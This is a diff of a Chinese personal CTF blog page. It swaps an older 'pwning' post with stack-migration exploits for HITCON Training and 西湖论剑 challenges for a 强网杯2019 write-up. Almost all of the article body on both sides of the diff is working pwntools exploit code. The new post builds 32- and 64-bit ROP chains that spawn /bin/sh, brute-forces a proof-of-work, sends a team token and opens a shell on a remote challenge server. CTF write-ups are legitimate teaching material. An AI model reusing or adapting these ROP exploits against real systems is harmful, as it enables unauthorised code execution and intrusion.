@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>pwning | 风云阁</title>
+  <title>强网杯2019 | 风云阁</title>
   <meta name="keywords" content="">
-  <meta name="description" content="pwning | 风云阁">
+  <meta name="description" content="强网杯2019 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
 <meta property="og:type" content="article">
@@ -355,19 +355,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-pwning" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-强网杯2019" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">pwning</h1>
+        <h1 class="article-title">强网杯2019</h1>
     
     <div class="article-meta">
         
         
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
         
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 02:06:12'>2019-05-10 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-11 01:15:22'>2020-01-16 02:06</time>
         
     </div>
     <div class="article-meta">
@@ -389,7 +395,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwning-Magic"><span class="toc-text">Pwning Magic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Migration"><span class="toc-text">Stack Migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-Training"><span class="toc-text">HITCON Training</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#西湖论剑线下赛-pwn-main"><span class="toc-text">西湖论剑线下赛 pwn main</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -405,89 +411,130 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Pwning-Magic"><a href="#Pwning-Magic" class="headerlink" title="Pwning Magic"></a>Pwning Magic</h1><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><blockquote>
-<p> Download link:</p>
-<p><a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
-</blockquote>
-<h2 id="HITCON-Training"><a href="#HITCON-Training" class="headerlink" title="HITCON Training"></a>HITCON Training</h2><pre><code class="python">from pwn import *
-p = process(&#39;./migration&#39;)
-context.arch = &#39;i386&#39;
-elf = ELF(&#39;./migration&#39;,False)
-libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;,False)
-bss = elf.bss()
-buf = bss+0x200
-buf2 = bss+0x300
-leave_ret = 0x08048504
-pop_ebx_ret = 0x0804836d
-read_plt = elf.symbols[&#39;read&#39;]
-read_got = elf.got[&#39;read&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-puts_plt = elf.symbols[&#39;puts&#39;]
-puts_libc = libc.symbols[&#39;puts&#39;]
-sys_libc = libc.symbols[&#39;system&#39;]
+        <pre><code>
+ROPgadget --binary _stkof --ropchain
+ROPgadget --binary __stkof --ropchain
 
-p.recvuntil(&#39;:\n&#39;)
-pay = &#39;a&#39;*0x28+flat([buf,read_plt,leave_ret,0,buf,100])
-p.send(pay)
-sleep(0.01)
-pay = flat([buf2,puts_plt,pop_ebx_ret,puts_got,read_plt,leave_ret,0,buf2,100])
-p.send(pay)
+加了拟态防御，需要同一个payload来pwn掉两个程序
+64位按正常的ROP打，32位加一个 RET NUMBER 来跳转栈顶，跳到64位payload的后面32位payload，从而getshell
 
-puts_real = u32(p.recv(4))
-print hex(puts_real)
+攻击脚本：</code></pre><pre><code class="python">from pwn import *
+from struct import pack
+import random, string, subprocess, os, sys
+from hashlib import sha256
 
-libc_base = puts_real - puts_libc
-sys_real = libc_base + sys_libc
+def ropchain(bit):
+    if bit == 64:
 
-pay = flat([0,sys_real,0,buf2+4*4,&#39;/bin/sh\x00&#39;])
-p.sendline(pay)
+        p = &#39;&#39;
 
-p.interactive()</code></pre>
-<h2 id="西湖论剑线下赛-pwn-main"><a href="#西湖论剑线下赛-pwn-main" class="headerlink" title="西湖论剑线下赛 pwn main"></a>西湖论剑线下赛 pwn main</h2><p>64位栈迁移</p>
-<pre><code class="python">#!/usr/bin/env python
-#coding=utf8
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;amd64&#39;
-elf = ELF(&#39;./main&#39;,False)
-libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,False)
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data
+        p += pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret
+        p += &#39;/bin//sh&#39;
+        p += pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000004005f6) # pop rdi ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8
+        p += pack(&#39;&lt;Q&#39;, 0x000000000043b9d5) # pop rdx ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000461110) # mov rax, 5; ret;
+        p += pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret
+        p += p64(0x3b)
+        p += pack(&#39;&lt;Q&#39;, 0x0000000000461645) # syscall ; ret
+        return p
 
-if 0:
-    context.log_level = &#39;debug&#39;
-    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-    gdb.attach(p)
 
-puts_plt = elf.symbols[&#39;puts&#39;]
-puts_got  = elf.got[&#39;puts&#39;]
-read_plt = elf.symbols[&#39;read&#39;]
-puts_libc = libc.symbols[&#39;puts&#39;]
-main_addr = 0x4006C3
-pop_rdi_ret = 0x00000000004007a3
-leave_ret = 0x0000000000400733
-pop_rbp_ret =  0x00000000004005e0
-read_leave_ret = 0x400718 #lea rax, [rbp-40h]
-one_off = 0xf1147
+    elif bit == 32:
+        p = &#39;&#39;
 
-#bss = elf.bss#0x602000-0x200
-name_addr = 0x00601080
-buf = 0x0601080+0x600
-buf2 = buf+0x100
+        p += pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data
+        p += pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret
+        p += &#39;/bin&#39;
+        p += pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret
+        p += pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9064) # @ .data + 4
+        p += pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret
+        p += &#39;//sh&#39;
+        p += pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret
+        p += pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8
+        p += pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret
+        p += pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data
+        p += pack(&#39;&lt;I&#39;, 0x0806e9f2) # pop ecx ; pop ebx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8
+        p += pack(&#39;&lt;I&#39;, 0x080d9060) # padding without overwrite ebx
+        p += pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8
+        p += pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret
+        p += pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret
 
-p.recvuntil(&#39;Input Your Name:\n&#39;)
-rop = &#39;\x00&#39;*0x100
-rop += flat([buf2,pop_rdi_ret,puts_got,puts_plt,read_leave_ret])
-p.send(rop)
-p.recvuntil(&#39;Input Buffer:\n&#39;)
-rop = &#39;a&#39;*0x40; rop += flat([name_addr+0x100,leave_ret])
-p.send(rop)
-puts_real = u64(p.recv(6)+&#39;\x00&#39;*2)
-one = puts_real - puts_libc + one_off
-print hex(one)
-rop = flat([one,0,0,0,0,0,0,0,buf2-0x48,leave_ret])
-p.send(rop)
+        p += p32(11)
+        p += pack(&#39;&lt;I&#39;, 0x080495a3) # int 0x80
+        return p
 
-p.interactive()
-</code></pre>
+    else:
+        return None
+
+
+def remote_attack():
+    team_token = &#39;b67f9528c4a5c8cf7b32d064e0486493&#39;
+
+    def brute(suffix, expected):
+        for i in xrange(0, 0xff):
+            for j in xrange(0, 0xff):
+                for k in xrange(0, 0xff):
+                    x = chr(i) + chr(j) + chr(k)
+                    h = sha256(suffix + x).hexdigest()
+                    if h == expected:
+                        skr = (suffix + x).encode(&#39;hex&#39;)
+                        return skr
+
+
+
+    io = remote(&#39;49.4.51.149&#39;,25391)
+    io.recvuntil(&#39;hexdigest()=&#39;)
+    sha = io.recv(64)
+    io.recvuntil(&quot;ncode(&#39;hex&#39;)=&quot;)
+    pre = io.recv(10).decode(&#39;hex&#39;)
+
+    skr = brute(pre,sha)
+    print &#39;skr::&#39;,skr
+    io.sendline(skr);sleep(0.5)
+
+    io.sendline(team_token)
+    print &#39;Send team_token successfully!&#39;
+
+    buf = 0x80daedb
+    read_puts_leave_ret = 0x8048907
+    leave_ret = 0x804892E
+
+    ret_10c = 0x8099bbe#0x0807da0a#: ret 0x126
+    ret = 0x806e9cc 
+    buf = 0x80daedb
+    read_puts_leave_ret = 0x8048907
+    leave_ret = 0x804892E
+    rop64 = ropchain(64)
+
+    pay = &#39;a&#39;*0x110\
+    +p32(ret_10c)+p32(ret)\
+    +rop64\
+    +&#39;\x00&#39;*(0x10c-len(rop64))\
+    +ropchain(32)
+
+    io.send(pay);sleep(0.1)
+    io.interactive()
+
+remote_attack()</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -497,12 +544,12 @@ p.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>pwning</p>
+    <p><span class="copy-title">文章标题:</span>强网杯2019</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-10, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 02:06:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/05/10/pwning/" title="pwning">https://primelyw.github.io/2019/05/10/pwning/</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-16, 02:06:12</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-11, 01:15:22</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/" title="强网杯2019">https://primelyw.github.io/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
